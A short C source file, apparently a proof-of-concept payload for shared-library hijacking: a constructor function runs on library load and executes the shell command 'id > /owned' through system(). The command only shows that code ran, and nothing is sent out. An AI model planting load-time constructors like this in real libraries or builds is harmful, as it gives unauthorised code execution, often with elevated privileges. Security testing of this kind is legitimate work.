#include <stdio.h>
#include <stdlib.h>

// This function will be executed as soon as the library is loaded.
void __attribute__((constructor)) poc() {
  system("id > /owned");
}